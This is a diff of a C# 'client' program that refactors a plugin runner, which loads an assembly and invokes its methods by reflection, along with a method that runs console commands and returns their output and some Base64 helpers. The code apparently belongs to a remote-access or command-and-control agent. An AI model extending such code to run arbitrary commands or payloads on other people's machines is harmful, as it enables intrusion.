@@ -161,7 +161,7 @@ namespace client
             /*
             * this should search through all classes to find the Main or other starting method
             */
-            string ret = "lala";
+            string ret = "Failed to run plugin";
             foreach(Type oType in asm.GetTypes()){
                 try{
                     dynamic c = Activator.CreateInstance(oType);
@@ -170,22 +170,12 @@ namespace client
                     ret = method.Invoke(c, null);
                     return ret;
                 } catch {
-                    Console.WriteLine("cannot find Main method");
                     continue;
                 }
             }
             return ret;
             //File.WriteAllBytes("./file", Base64DecodeFile(command));
             //return "did it";
-        }
-
-        private Byte[] Base64DecodeFile(string file){
-            return Convert.FromBase64String(file);
-        }
-
-        private string Base64EncodeString(string str){
-            //takes a string and returns it in base64
-            return Convert.ToBase64String(Encoding.ASCII.GetBytes(str));
         }
 
         private async Task<string> ConsoleCommand(string command){
@@ -203,7 +193,7 @@ namespace client
                         using (StreamReader reader = process.StandardOutput)
                         {
                             string result = await reader.ReadToEndAsync();
-                            result = HttpUtility.UrlEncode(result);
+                            //result = HttpUtility.UrlEncode(result);
                             Console.WriteLine(result);
                             return result;
                         }
@@ -229,6 +219,15 @@ namespace client
                 return (false, "");
             }
         }
+        private Byte[] Base64DecodeFile(string file){
+            return Convert.FromBase64String(file);
+        }
+
+        private string Base64EncodeString(string str){
+            //takes a string and returns it in base64
+            return Convert.ToBase64String(Encoding.ASCII.GetBytes(str));
+        }
+
         
     }
 
